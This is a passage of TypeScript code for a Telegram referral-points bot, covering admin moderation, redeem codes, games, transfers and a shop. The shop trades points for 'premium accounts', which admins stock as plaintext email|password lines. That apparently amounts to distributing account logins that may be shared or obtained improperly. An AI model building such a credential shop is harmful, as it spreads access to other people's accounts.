            await bot.sendMessage(chatId, `⚠️ @${esc(targetUsername)} warned (${warnings}/3)\n🚫 AUTO-BANNED for reaching 3 warnings!`, adminMenu());
            if (target.chatId) {
              try { await bot.sendMessage(Number(target.chatId), "🚫 You have been banned for exceeding 3 warnings!"); } catch {}
            }
          } else {
            await bot.sendMessage(chatId, `⚠️ @${esc(targetUsername)} warned! (${warnings}/3)`, adminMenu());
            if (target.chatId) {
              try { await bot.sendMessage(Number(target.chatId), `⚠️ You received a warning! (${warnings}/3)\n\n3 warnings = auto-ban`); } catch {}
            }
          }
          return;
        }

        if (state.action === "temp_ban") {
          delete pending[Number(tgUserId)];
          const parts = text.trim().split(/\s+/);
          if (parts.length < 2) return bot.sendMessage(chatId, "❌ Format: @username hours", adminMenu());
          const targetUsername = parts[0].replace("@", "");
          const hours = parseInt(parts[1]);
          if (!hours || hours <= 0) return bot.sendMessage(chatId, "❌ Invalid hours.", adminMenu());
          const target = await storage.getUserByUsername(targetUsername);
          if (!target) return bot.sendMessage(chatId, "❌ User not found.", adminMenu());
          const until = Date.now() + hours * 60 * 60 * 1000;
          await storage.tempBanUser(target.id, until);
          await bot.sendMessage(chatId, `⏱ @${esc(targetUsername)} temp-banned for ${hours} hours!`, adminMenu());
          if (target.chatId) {
            try { await bot.sendMessage(Number(target.chatId), `⏱ You have been temporarily banned for ${hours} hours.`); } catch {}
          }
          return;
        }

        if (state.action === "gift_all") {
          const amount = parseInt(text.trim());
          if (!amount || amount <= 0) {
            delete pending[Number(tgUserId)];
            return bot.sendMessage(chatId, "❌ Invalid amount.", adminMenu());
          }
          pending[Number(tgUserId)] = { action: "gift_all_confirm", data: { amount } };
          const totalUsers = await storage.getTotalUsers();
          return bot.sendMessage(chatId,
            `🎁 Confirm Gift\n${"─".repeat(30)}\n\n💰 Amount: <b>${amount} points</b>\n👥 Users: ~${totalUsers}\n\nAre you sure you want to gift ${amount} points to ALL users?`,
            { parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "✅ Yes, Send Gift", callback_data: "gift_confirm_yes" }, { text: "❌ Cancel", callback_data: "gift_confirm_no" }]] } }
          );
        }

        if (state.action === "gift_all_confirm") { delete pending[Number(tgUserId)]; return; }

        if (state.action === "rc_step1_name") {
          const codeName = text.trim();
          if (!codeName || codeName.includes(" ")) return bot.sendMessage(chatId, "❌ Code name must be one word (no spaces). Try again:");
          const existing = await storage.getRedeemCode(codeName);
          if (existing) return bot.sendMessage(chatId, "❌ This code name already exists. Choose a different one:");
          pending[Number(tgUserId)] = { action: "rc_step2_pts", data: { codeName } };
          return bot.sendMessage(chatId,
            `🎟️ Create Redeem Code — Step 2/3\n${"─".repeat(30)}\n\n🎟️ Code: ${esc(codeName)}\n\n💰 How many points should this code give?`,
            {
              parse_mode: "HTML",
              reply_markup: {
                inline_keyboard: [
                  [{ text: "1 pt", callback_data: "rc_pts:1" }, { text: "2 pts", callback_data: "rc_pts:2" }, { text: "3 pts", callback_data: "rc_pts:3" }],
                  [{ text: "5 pts", callback_data: "rc_pts:5" }, { text: "10 pts", callback_data: "rc_pts:10" }, { text: "25 pts", callback_data: "rc_pts:25" }],
                  [{ text: "✏️ Custom amount", callback_data: "rc_pts:0" }],
                ],
              },
            }
          );
        }

        if (state.action === "rc_step2_custom_pts") {
          const pts = parseInt(text.trim());
          if (isNaN(pts) || pts <= 0) return bot.sendMessage(chatId, "❌ Must be a positive number. Try again:");
          pending[Number(tgUserId)] = { action: "rc_step3_uses", data: { ...state.data, points: pts } };
          return bot.sendMessage(chatId,
            `🎟️ Create Redeem Code — Step 2/2\n${"─".repeat(30)}\n\n🎟️ Code: ${esc(state.data?.codeName || "")}\n💰 Points: ${pts}\n\n👥 How many users can use this code?`,
            {
              parse_mode: "HTML",
              reply_markup: {
                inline_keyboard: [
                  [{ text: "1 user", callback_data: "rc_uses:1" }, { text: "5 users", callback_data: "rc_uses:5" }, { text: "10 users", callback_data: "rc_uses:10" }],
                  [{ text: "25 users", callback_data: "rc_uses:25" }, { text: "50 users", callback_data: "rc_uses:50" }, { text: "100 users", callback_data: "rc_uses:100" }],
                  [{ text: "♾ Unlimited (9999)", callback_data: "rc_uses:9999" }],
                  [{ text: "✏️ Custom number", callback_data: "rc_uses:0" }],
                ],
              },
            }
          );
        }

        if (state.action === "rc_step3_custom_uses") {
          const uses = parseInt(text.trim());
          if (isNaN(uses) || uses <= 0) return bot.sendMessage(chatId, "❌ Must be a positive number. Try again:");
          const data = state.data || {};
          delete pending[Number(tgUserId)];
          const rc = await storage.createRedeemCode(data.codeName, data.points, uses, String(tgUserId));
          return bot.sendMessage(chatId,
            `✅ Redeem Code Created!\n${"─".repeat(30)}\n\n🎟️ Code: ${esc(rc.code)}\n💰 Points: ${rc.points}\n👥 Max uses: ${rc.maxUses}\n\n📢 Share this with users:\n/redeem ${esc(rc.code)}`,
            { parse_mode: "HTML", ...adminMenu() }
          );
        }

        if (state.action === "set_welcome") {
          delete pending[Number(tgUserId)];
          if (text.toLowerCase() === "reset") {
            customWelcomeMessage = "";
            saveGameState();
            return bot.sendMessage(chatId, "✅ Welcome message reset to default!", adminMenu());
          }
          customWelcomeMessage = text;
          saveGameState();
          return bot.sendMessage(chatId, `✅ Welcome message updated!\n\n📝 Preview:\n${esc(text)}`, { parse_mode: "HTML", ...adminMenu() });
        }

        if (state.action === "add_points") {
          delete pending[Number(tgUserId)];
          const parts = text.split(" ");
          if (parts.length < 2) return bot.sendMessage(chatId, "Format: @username amount");
          const uname = parts[0];
          const amt = parseInt(parts[1]);
          if (isNaN(amt) || amt <= 0) return bot.sendMessage(chatId, "Invalid amount.");
          const target = await storage.getUserByUsername(uname.replace("@", ""));
          if (!target) return bot.sendMessage(chatId, "User not found.");
          await storage.addPoints(target.id, amt);
          return bot.sendMessage(chatId, `✅ Added ${amt} points to @${target.username}.\nNew balance: ${target.points + amt}`, adminMenu());
        }

        if (state.action === "remove_points") {
          delete pending[Number(tgUserId)];
          const parts = text.split(" ");
          if (parts.length < 2) return bot.sendMessage(chatId, "Format: @username amount");
          const uname = parts[0];
          const amt = parseInt(parts[1]);
          if (isNaN(amt) || amt <= 0) return bot.sendMessage(chatId, "Invalid amount.");
          const target = await storage.getUserByUsername(uname.replace("@", ""));
          if (!target) return bot.sendMessage(chatId, "User not found.");
          if (target.points < amt) return bot.sendMessage(chatId, `❌ User only has ${target.points} points.`, { parse_mode: "HTML" });
          await storage.deductPoints(target.id, amt);
          return bot.sendMessage(chatId, `✅ Removed ${amt} points from @${target.username}.\nNew balance: ${target.points - amt}`, adminMenu());
        }

        if (state.action === "ban_user") {
          delete pending[Number(tgUserId)];
          const parts = text.split("|");
          const uname = parts[0].trim().replace("@", "");
          const reason = parts[1]?.trim() || "No reason given";
          const target = await storage.getUserByUsername(uname);
          if (!target) return bot.sendMessage(chatId, "User not found.");
          await storage.banUser(target.id, reason);
          return bot.sendMessage(chatId, `🚫 Banned @${target.username}\nReason: ${reason}`, adminMenu());
        }

        if (state.action === "unban_user") {
          delete pending[Number(tgUserId)];
          const uname = text.trim().replace("@", "");
          const target = await storage.getUserByUsername(uname);
          if (!target) return bot.sendMessage(chatId, "User not found.");
          await storage.unbanUser(target.id);
          return bot.sendMessage(chatId, `✅ Unbanned @${target.username}`, adminMenu());
        }

        if (state.action === "add_stock") {
          if (!state.data?.itemId) {
            // FIX: Try to find item by ID or by name
            let item = await storage.getItem(text.trim());
            if (!item) {
              const items = await storage.getItems();
              item = items.find(i => i.name.toLowerCase() === text.trim().toLowerCase()) || null;
            }
            if (!item) {
              delete pending[Number(tgUserId)];
              return bot.sendMessage(chatId, "❌ Item not found. Use the buttons or check the item ID.", adminMenu());
            }
            pending[Number(tgUserId)] = { action: "add_stock", data: { itemId: item.id } };
            return bot.sendMessage(chatId,
              `📦 Adding codes for: ${item.name}\n\nSend accounts using | to separate fields:\nemail|password|country|plan\n\n✅ You can send 1 account or many (one per line)\n✅ Keep sending more — each message adds to stock\n✅ Send /done when finished\n\nExample:\nemail@gmail.com|pass123|US|Premium`,
              { parse_mode: "HTML" }
            );
          } else {
            if (text.trim().toLowerCase() === "/done") {
              delete pending[Number(tgUserId)];
              const item = await storage.getItem(state.data.itemId);
              const available = await storage.getAvailableCodeCount(state.data.itemId);
              if (available <= 5) {
                const warn = `⚠️ LOW STOCK ALERT!\n\n🎁 Item: ${item?.name}\n📦 Remaining: ${available} codes\n⏰ ${new Date().toLocaleString()}`;
                if (OWNER_ID) { try { await bot.sendMessage(OWNER_ID, warn, { parse_mode: "HTML" }); } catch {} }
              }
              return bot.sendMessage(chatId,
                `✅ Done adding stock!\n\n🎁 Item: ${item?.name}\n📦 Total available: ${available} codes`,
                { parse_mode: "HTML", ...adminMenu() }
              );
            }
            const codeStrings = text.split(/\r?\n/).map(c => c.trim()).filter(c => c.length > 0);
            if (codeStrings.length === 0) return bot.sendMessage(chatId, "❌ No codes found. Send codes or /done to finish.");
            const stockCodeObjs = codeStrings.map(code => ({ itemId: state.data.itemId, code }));
            await storage.addStockCodes(stockCodeObjs);
            const item = await storage.getItem(state.data.itemId);
            const available = await storage.getAvailableCodeCount(state.data.itemId);
            await storage.updateItem(state.data.itemId, { stock: available });
            return bot.sendMessage(chatId,
              `✅ Added ${codeStrings.length} code(s) to ${item?.name}\n📦 Total available stock: ${available}\n\n📩 Send more codes or /done to finish`,
              { parse_mode: "HTML" }
            );
          }
        }

        if (state.action === "add_admin") {
          delete pending[Number(tgUserId)];
          if (!isBotOwner(tgUserId)) return bot.sendMessage(chatId, "⛔ Owner only.");
          const tid = text.trim();
          await storage.addAdmin(tid, tgUsername);
          return bot.sendMessage(chatId, `✅ Admin added! Telegram ID: ${tid}`, adminMenu());
        }

        if (state.action === "remove_admin") {
          delete pending[Number(tgUserId)];
          if (!isBotOwner(tgUserId)) return bot.sendMessage(chatId, "⛔ Owner only.");
          const tid = text.trim();
          await storage.removeAdmin(tid);
          return bot.sendMessage(chatId, `✅ Admin removed! Telegram ID: ${tid}`, adminMenu());
        }
      }

      // USER MENU BUTTONS
      if (text === "💰 Balance") {
        const isOwner = isBotOwner(tgUserId);
        const ptsDisplay = isOwner ? "∞" : String(user.points);
        const gptsDisplay = isOwner ? "∞" : String(user.gamePoints || 0);
        return bot.sendMessage(chatId, `💰 Balance: ${ptsDisplay} Points\n🎮 Game Points: ${gptsDisplay}\n\n🏅 Refer friends & earn more!`, { parse_mode: "HTML" });
      }

      if (text === "🏆 Top Referrals") {
        const allUsers = await storage.getAllUsers();
        const refCounts = new Map<string, number>();
        allUsers.forEach(u => {
          if (u.referredBy) refCounts.set(u.referredBy, (refCounts.get(u.referredBy) || 0) + 1);
        });
        const topUsers = allUsers
          .map(u => ({ username: u.username, count: refCounts.get(u.id) || 0 }))
          .filter(u => u.count > 0)
          .sort((a, b) => b.count - a.count)
          .slice(0, 10);
        let msg2 = "🏆 <b>Top 10 Referrals</b>\n\n";
        if (topUsers.length === 0) msg2 += "No referrals yet.";
        else topUsers.forEach((u, i) => { msg2 += `${i + 1}. @${esc(u.username)} — ${u.count} referrals\n`; });
        return bot.sendMessage(chatId, msg2, { parse_mode: "HTML" });
      }

      if (text === "👥 Referral") {
        const referrals = await storage.getReferredUsers(user.id);
        const link = `https://t.me/${BOT_USERNAME}?start=ref_${user.referralCode}`;
        return bot.sendMessage(chatId,
          `💰 Earn 1 POINT per referral!\n\n🔗 Your Link:\n${link}\n\n🎯 You Invited: ${referrals.length} Users\n\nShare with friends & earn!`,
          { parse_mode: "HTML", disable_web_page_preview: true }
        );
      }

      if (text === "💲 Withdraw") {
        if (isShopLocked && !isAdmin) return bot.sendMessage(chatId, "🔒 The shop is currently locked by admin. Please try again later.");
        const storeItems = await storage.getItems();
        if (storeItems.length === 0) return bot.sendMessage(chatId, "🛍️ No items available yet. Check back soon!");
        let msg2 =
          `🎮 PREMIUM SHOP\n${"─".repeat(32)}\n\n🎁 Exchange Your Points for Premium Accounts\n\n💰 General Points: ${user.points}\n🎮 Game Points: ${user.gamePoints || 0}\n\n${"─".repeat(32)}\n\n`;
        const itemEmojis = ["⭐", "💎", "🔥", "⚡", "🎁", "🚀", "👑", "🎉"];
        storeItems.forEach((item, i) => {
          const emoji = itemEmojis[i % itemEmojis.length];
          const stockTxt = item.stock !== null && item.stock !== undefined ? ` | Stock: ${item.stock}` : "";
          msg2 += `👉${emoji} ${item.name} [ ${item.price} Points ]${stockTxt}.\n`;
        });
        const inlineButtons: TelegramBot.InlineKeyboardButton[][] = storeItems.map((item, i) => {
          const emoji = itemEmojis[i % itemEmojis.length];
          const outOfStock = item.stock !== null && item.stock !== undefined && item.stock <= 0;
          return [{
            text: outOfStock ? `❌ ${item.name} (Out of Stock)` : `${emoji} Buy ${item.name} (${item.price} pts)`,
            callback_data: outOfStock ? "out_of_stock" : `buy_item:${item.id}`,
          }];
        });
        return bot.sendMessage(chatId, msg2, { parse_mode: "HTML", reply_markup: { inline_keyboard: inlineButtons } });
      }

      if (text === "🎟️ Redeem Code") {
        pending[Number(tgUserId)] = { action: "redeem_waiting" };
        return bot.sendMessage(chatId, `🎟️ Redeem a Code\n${"─".repeat(30)}\n\n📝 Send your redeem code now:`, { parse_mode: "HTML" });
      }

      if (text === "🎮 Games 🎮") {
        if (!isGameEnabled && !isAdmin) {
          return bot.sendMessage(chatId,
            `🎮 Game Center\n${"─".repeat(30)}\n\n❌ Games are currently disabled.\n\nAn admin will enable them soon!`,
            { parse_mode: "HTML" }
          );
        }
        const uInfo = await storage.getUserByTelegramId(String(tgUserId));
        return bot.sendMessage(chatId,
          `🎮 Game Center\n${"─".repeat(30)}\n\n💰 General Points: ${isBotOwner(tgUserId) ? "∞" : String(uInfo?.points || 0)}\n🎮 Game Points: ${isBotOwner(tgUserId) ? "∞" : String(uInfo?.gamePoints || 0)}\n\nChoose a game to play:`,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "🎲 Dice Roll", callback_data: "game_select:dice" }, { text: "🪙 Coin Flip", callback_data: "game_select:coin" }],
                [{ text: "🎰 Lucky Spin", callback_data: "game_select:spin" }, { text: "🃏 Blackjack", callback_data: "game_select:blackjack" }],
                [{ text: "🏇 Horse Race", callback_data: "game_select:horse" }, { text: "🥊 Boxing", callback_data: "game_select:boxing" }],
                [{ text: "🏀 Basketball", callback_data: "game_select:basketball" }, { text: "🔢 Number Guess", callback_data: "game_select:numguess" }],
                [{ text: "🔫 Russian Roulette", callback_data: "game_select:roulette" }],
                [{ text: "❌ Close", callback_data: "game_cancel" }],
              ],
            },
          }
        );
      }

      if (text === "📊 Statistics") {
        const referrals = await storage.getReferredUsers(user.id);
        const link = `https://t.me/${BOT_USERNAME}?start=ref_${user.referralCode}`;
        const isOwner = isBotOwner(tgUserId);
        const ptsDisplay = isOwner ? "∞" : String(user.points);
        const gptsDisplay = isOwner ? "∞" : String(user.gamePoints || 0);
        return bot.sendMessage(chatId,
          `📊 Your Stats\n\n💰 General Points: ${ptsDisplay}\n🎮 Game Points: ${gptsDisplay}\n👥 Referrals: ${referrals.length}\n\n🔗 Link:\n${link}`,
          { parse_mode: "HTML", disable_web_page_preview: true }
        );
      }

      if (text === "📞 Support") {
        pending[Number(tgUserId)] = { action: "support_ticket" };
        return bot.sendMessage(chatId,
          "📞 Customer Support\n\nPlease type your complaint, inquiry, or suggestion below. Our team will review it and reply directly here.\n\nOr tap <b>Cancel</b> to return.",
          { parse_mode: "HTML", reply_markup: { keyboard: [[{ text: "🔙 Cancel" }]], resize_keyboard: true } }
        );
      }

      if (text === "⭐ Rate Us") {
        return bot.sendMessage(chatId,
          `⭐ Rate Our Bot!\n${"─".repeat(30)}\n\nHow would you rate your experience?\n\nYour feedback helps us improve!`,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "1 ⭐", callback_data: "rate:1" }, { text: "2 ⭐", callback_data: "rate:2" }, { text: "3 ⭐", callback_data: "rate:3" }],
                [{ text: "4 ⭐", callback_data: "rate:4" }, { text: "5 ⭐", callback_data: "rate:5" }, { text: "❌ Cancel", callback_data: "rate:cancel" }],
              ],
            },
          }
        );
      }

      if (text === "🎡 Daily Spin") {
        if (!isDailySpinEnabled) {
          return bot.sendMessage(chatId, `🎡 Daily Spin\n${"─".repeat(30)}\n\n🔒 Daily Spin is currently <b>disabled</b>.\n\nCheck back later!`, { parse_mode: "HTML" });
        }
        const today = new Date().toISOString().split("T")[0];
        const lastSpin = await storage.getLastSpin(user.id);
        if (lastSpin === today) {
          return bot.sendMessage(chatId, `🎡 Daily Spin\n${"─".repeat(30)}\n\n❌ You already spun today!\n\nCome back tomorrow for another spin! 🕐`, { parse_mode: "HTML" });
        }
        await storage.setLastSpin(user.id, today);
        const prizes = [1, 2, 3, 5, 10, 0, 1, 2, 0, 3];
        const prize = prizes[Math.floor(Math.random() * prizes.length)];
        if (prize > 0) {
          await storage.addPoints(user.id, prize);
          return bot.sendMessage(chatId,
            `🎡 Daily Spin\n${"─".repeat(30)}\n\n🎉 Congratulations!\n\nYou won <b>${prize} points</b>!\n\n💰 New Balance: ${(user.points || 0) + prize} points\n\nCome back tomorrow for another spin!`,
            { parse_mode: "HTML" }
          );
        }
        return bot.sendMessage(chatId,
          `🎡 Daily Spin\n${"─".repeat(30)}\n\n😢 Better luck tomorrow!\n\nYou didn't win this time.\nCome back tomorrow for another chance!`,
          { parse_mode: "HTML" }
        );
      }

      if (text === "💸 Transfer") {
        if (isTransferLocked && !isAdmin) return bot.sendMessage(chatId, "🔒 Transfers are currently locked by admin. Please try again later.");
        if ((user.points || 0) < 10) {
          return bot.sendMessage(chatId,
            `💸 Transfer Points\n${"─".repeat(30)}\n\n❌ You need at least <b>10 points</b> to transfer.\n\n💰 Your Balance: ${user.points} points`,
            { parse_mode: "HTML" }
          );
        }
        pending[Number(tgUserId)] = { action: "transfer_waiting" };
        return bot.sendMessage(chatId,
          `💸 Transfer Points\n${"─".repeat(30)}\n\nSend points to another user!\n\n📝 Format: @username amount\nExample: @john 50\n\n⚠️ Fee: 10% on every transfer\n💰 Your Balance: ${user.points} points`,
          { parse_mode: "HTML" }
        );
      }

      if (text === "🎰 Lottery") {
        if (!lotteryActive) {
          return bot.sendMessage(chatId,
            `🎰 Lottery\n${"─".repeat(30)}\n\n❌ No lottery is currently active.\n\nAn admin will start one soon!`,
            { parse_mode: "HTML" }
          );
        }
        const { text: lText, opts } = buildLotteryUserMessage(user, tgUserId);
        return bot.sendMessage(chatId, lText, opts);
      }

      if (text === "🎁 Giveaway") {
        if (!isGiveawayEnabled) {
          return bot.sendMessage(chatId,
            `🎁 Giveaway\n${"─".repeat(30)}\n\n❌ No giveaway available right now.\n\nStay tuned for the next one! 🔔`,
            { parse_mode: "HTML" }
          );
        }
        if (!giveaway.active) {
          return bot.sendMessage(chatId,
            `🎁 Giveaway\n${"─".repeat(30)}\n\n❌ No active giveaway at the moment.\n\nOne will start soon! 🔔`,
            { parse_mode: "HTML" }
          );
        }
        const timeLeft = formatTimeLeft(giveaway.endTime - Date.now());
        const alreadyJoined = giveaway.participants.find(p => p.odId === tgUserId);
        return bot.sendMessage(chatId,
          `🎁 <b>GIVEAWAY IS ACTIVE!</b>\n${"─".repeat(30)}\n\n🏆 Prize: 1 point\n👥 Participants: ${giveaway.participants.length}\n⏳ Ends in: ${timeLeft}\n${giveaway.requiredReferrals > 0 ? `📨 Required Referrals: ${giveaway.requiredReferrals}\n` : ""}${alreadyJoined ? "\n✅ You have already joined!" : "\nTap below to join now!"}`,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: alreadyJoined
                ? [[{ text: "✅ Already Joined", callback_data: "noop" }]]
                : [[{ text: "🎁 Join Giveaway", callback_data: "giveaway_join" }]],
            },
          }
        );
      }

      if (text === "🔐 Admin Panel") {
        if (!isAdmin) return bot.sendMessage(chatId, "⛔ Access denied.");
        return bot.sendMessage(chatId, "👑 Admin Panel\n\nChoose an option:", adminMenu());
      }

      if (text === "🔙 User Menu") {
        return sendWelcome(chatId, user, tgUserId);
      }

      if (!isAdmin) return;

      if (text === "📊 Bot Stats") {
        const totalUsers = await storage.getTotalUsers();
        const totalPurchases = await storage.getTotalPurchases();
        const adminsCount = (await storage.getAdmins()).length;
        return bot.sendMessage(chatId,
          `📊 Bot Statistics\n\n👥 Total Users: ${totalUsers}\n🛍️ Total Purchases: ${totalPurchases}\n👑 Admins: ${adminsCount}`,
          adminMenu()
        );
      }

      if (text === "📈 Advanced Stats") {
        const now = new Date();
        const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
        const weekAgo = new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000);
        const monthAgo = new Date(now.getTime() - 30 * 24 * 60 * 60 * 1000);
        const [todayUsers, weekUsers, monthUsers] = await Promise.all([
          storage.getUsersSince(today), storage.getUsersSince(weekAgo), storage.getUsersSince(monthAgo),
        ]);
        const [todayPurchases, weekPurchases, monthPurchases] = await Promise.all([
          storage.getPurchasesSince(today), storage.getPurchasesSince(weekAgo), storage.getPurchasesSince(monthAgo),
        ]);
        const topPoints = await storage.getTopUsersByPoints(5);
        const topRefs = await storage.getReferralStats();
        const totalUsers = await storage.getTotalUsers();
        const totalPurchases = await storage.getTotalPurchases();
        let msg2 = `📈 Advanced Statistics\n${"─".repeat(30)}\n\n`;
        msg2 += `📅 Users Joined\n   Today: ${todayUsers.length}\n   This week: ${weekUsers.length}\n   This month: ${monthUsers.length}\n   Total: ${totalUsers}\n\n`;
        msg2 += `🛍️ Purchases\n   Today: ${todayPurchases.length}\n   This week: ${weekPurchases.length}\n   This month: ${monthPurchases.length}\n   Total: ${totalPurchases}\n\n`;
        if (topPoints.length > 0) {
          msg2 += `💰 Top Users (Points)\n`;
          const medals = ["🥇", "🥈", "🥉"];
          topPoints.forEach((u: any, i: number) => { msg2 += `   ${medals[i] || `${i + 1}.`} @${esc(u.username)} — ${u.points} pts\n`; });
          msg2 += `\n`;
        }
        if (topRefs.length > 0) {
          msg2 += `👥 Top Referrers\n`;
          const medals = ["🥇", "🥈", "🥉"];
          topRefs.forEach((r: any, i: number) => { msg2 += `   ${medals[i] || `${i + 1}.`} @${esc(r.user.username)} — ${r.referralCount} refs\n`; });
        }
        return bot.sendMessage(chatId, msg2, adminMenu());
      }

      if (text === "👥 Users") {
        const allUsers = await storage.getAllUsers();
        let msg2 = `👥 Users (${allUsers.length})\n\n`;
        allUsers.slice(0, 20).forEach((u: any, i: number) => {
          msg2 += `${i + 1}. @${u.username} — 💰${u.points} pts${u.isBanned ? " 🚫BANNED" : ""}\n`;
        });
        if (allUsers.length > 20) msg2 += `\n... and ${allUsers.length - 20} more.`;
        return bot.sendMessage(chatId, msg2, adminMenu());
      }

      if (text === "🛍️ Items") {
        const storeItems = await storage.getItems();
        if (storeItems.length === 0) return bot.sendMessage(chatId, "No items yet. Use /additem to add.", adminMenu());
        let msg2 = `🛍️ Items (${storeItems.length})\n\n`;
        storeItems.forEach(item => {
          const stockTxt = item.stock === null || item.stock === undefined ? "∞" : String(item.stock);
          msg2 += `🔹 ${item.name} — ${item.price} pts | Stock: ${stockTxt}\n   🆔 <code>${item.id}</code>\n`;
          if (item.description) msg2 += `   ${item.description}\n`;
        });
        msg2 += `\nCommands:\n/additem Name|Price|Desc\n/delitem &lt;id&gt;`;
        return bot.sendMessage(chatId, msg2, { parse_mode: "HTML", ...adminMenu() });
      }

      if (text === "➕ Add Points") {
        pending[Number(tgUserId)] = { action: "add_points" };
        return bot.sendMessage(chatId, "Send: @username amount\n\nExample: @ahmed 5");
      }

      if (text === "➖ Remove Points") {
        pending[Number(tgUserId)] = { action: "remove_points" };
        return bot.sendMessage(chatId, "Send: @username amount\n\nExample: @ahmed 3");
      }

      if (text === "🚫 Ban User") {
        pending[Number(tgUserId)] = { action: "ban_user" };
        return bot.sendMessage(chatId, "Send: @username|reason\n\nExample: @spammer|Spamming");
      }

      if (text === "✅ Unban User") {
        pending[Number(tgUserId)] = { action: "unban_user" };
        return bot.sendMessage(chatId, "Send the username to unban:\n\nExample: @ahmed");
      }

      // FIX: Add Stock - show inline buttons instead of requiring ID
      if (text === "📦 Add Stock") {
        const storeItems = await storage.getItems();
        if (storeItems.length === 0) return bot.sendMessage(chatId, "No items yet. Use /additem first.", adminMenu());
        const buttons = storeItems.map(item => [{ text: `📦 ${item.name} (Stock: ${item.stock || 0})`, callback_data: `addstock_pick:${item.id}` }]);
        return bot.sendMessage(chatId, `📦 Add Stock\n\nChoose the item to add codes for:`, {
          parse_mode: "HTML",
          reply_markup: { inline_keyboard: buttons },
        });
      }

      if (text === "🗑 Delete Stock") {
        const storeItems = await storage.getItems();
        if (storeItems.length === 0) return bot.sendMessage(chatId, "No items yet.", adminMenu());
        const inlineButtons: TelegramBot.InlineKeyboardButton[][] = [];
        for (const item of storeItems) {
          const available = await storage.getAvailableCodeCount(item.id);
          inlineButtons.push([{ text: `🗑 ${item.name} (${available} available)`, callback_data: `del_stock_pick:${item.id}` }]);
        }
        return bot.sendMessage(chatId, `🗑 Delete Stock\n\nChoose the item to delete codes from:`, { parse_mode: "HTML", reply_markup: { inline_keyboard: inlineButtons } });
      }

      if (text === "👑 Admins") {
        if (!isBotOwner(tgUserId)) return bot.sendMessage(chatId, "⛔ Owner only.", adminMenu());
        const adminList = await storage.getAdmins();
        let msg2 = `👑 Admins (${adminList.length})\n\n`;
        adminList.forEach((a: any, i: number) => { msg2 += `${i + 1}. ID: ${a}\n`; });
        msg2 += `\nTo add: /addadmin <telegramId>\nTo remove: /removeadmin <telegramId>`;
        return bot.sendMessage(chatId, msg2, adminMenu());
      }

      if (text === "🎟️ Redeem Codes") {
        const codes = await storage.getAllRedeemCodes();
        let msg2 = `🎟️ Redeem Codes\n${"─".repeat(30)}\n\n`;
        if (codes.length === 0) msg2 += `📭 No codes yet.\n\n`;
        else {
          codes.forEach(rc => {
            const status = rc.currentUses >= rc.maxUses ? "❌" : "✅";
            msg2 += `${status} ${esc(rc.code)}\n   💰 ${rc.points} pts | 👥 ${rc.currentUses}/${rc.maxUses} uses\n\n`;
          });
        }
        return bot.sendMessage(chatId, msg2, {
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "➕ Create New Code", callback_data: "rc_create" }],
              ...(codes.length > 0 ? [[{ text: "🗑 Delete a Code", callback_data: "rc_delete_pick" }]] : []),
            ],
          },
        });
      }

      if (text === "📢 Channels") {
        if (!await isAdminOrOwner(tgUserId)) return;
        let list = "";
        if (CHANNELS.length === 0) {
          list = "No channels set.";
        } else {
          list = CHANNELS.map((ch, i) => `${i + 1}. <code>${esc(ch)}</code>`).join("\n");
        }
        return bot.sendMessage(chatId,
          `📢 <b>Force Join Channels</b>\n${"─".repeat(30)}\n\n${list}\n\n<b>Total:</b> ${CHANNELS.length}`,
          {
            parse_mode: "HTML",
            disable_web_page_preview: true,
            reply_markup: {
              inline_keyboard: [
                [{ text: "➕ Add Channel", callback_data: "ch_add" }, { text: "🗑 Remove Channel", callback_data: "ch_remove" }],
                [{ text: "📋 List Channels", callback_data: "ch_list" }, { text: "🗑 Remove All", callback_data: "ch_clear" }],
              ]
            }
          }
        );
      }

      if (text === "📢 Broadcast") {
        pending[Number(tgUserId)] = { action: "broadcast" };
        return bot.sendMessage(chatId, "📢 Send the message you want to broadcast to all users:");
      }

      if (text === "🎮 Game Control") {
        if (!await isAdminOrOwner(tgUserId)) return bot.sendMessage(chatId, "⛔ Admin only!");
        const status = isGameEnabled ? "✅ ENABLED" : "❌ DISABLED";
        return bot.sendMessage(chatId,
          `🎮 Game Control Panel\n${"─".repeat(30)}\n\nCurrent status: ${status}\n\nChoose action:`,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "✅ Enable Game", callback_data: "game_enable" }],
                [{ text: "❌ Disable Game", callback_data: "game_disable" }],
              ],
            },
          }
        );
      }

      if (text === "🎡 Spin Control") {
        if (!await isAdminOrOwner(tgUserId)) return bot.sendMessage(chatId, "⛔ Admin only!");
        const status = isDailySpinEnabled ? "✅ ENABLED" : "❌ DISABLED";
        return bot.sendMessage(chatId,
          `🎡 Daily Spin Control\n${"─".repeat(30)}\n\nCurrent status: ${status}\n\nChoose action:`,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "✅ Enable Daily Spin", callback_data: "spin_enable" }],
                [{ text: "❌ Disable Daily Spin", callback_data: "spin_disable" }],
              ],
            },
          }
        );
      }

      if (text === "⚠️ Warn User") {
        if (!isAdmin) return;
        pending[Number(tgUserId)] = { action: "warn_user" };
        return bot.sendMessage(chatId,
          `⚠️ Warn User\n${"─".repeat(30)}\n\n📝 Send username to warn:\nFormat: @username\n\n3 warnings = auto-ban`,
          { parse_mode: "HTML", ...adminMenu() }
        );
      }

      if (text === "⏱ Temp Ban") {
        if (!isAdmin) return;
        pending[Number(tgUserId)] = { action: "temp_ban" };
        return bot.sendMessage(chatId,
          `⏱ Temp Ban\n${"─".repeat(30)}\n\n📝 Format: @username hours\nExample: @john 24\n\nThis will ban the user for the specified hours.`,
          { parse_mode: "HTML", ...adminMenu() }
        );
      }

      if (text === "🎁 Gift All") {
        if (!isAdmin) return;
        pending[Number(tgUserId)] = { action: "gift_all" };
        return bot.sendMessage(chatId,
          `🎁 Gift All Users\n${"─".repeat(30)}\n\n📝 Enter the amount of points to give ALL users:`,
          { parse_mode: "HTML", ...adminMenu() }
        );
      }

      if (text === "⭐ Account Ratings") {
        if (!isAdmin) return;
        const allRatings = await storage.getAccountRatings();
        if (allRatings.length === 0) {
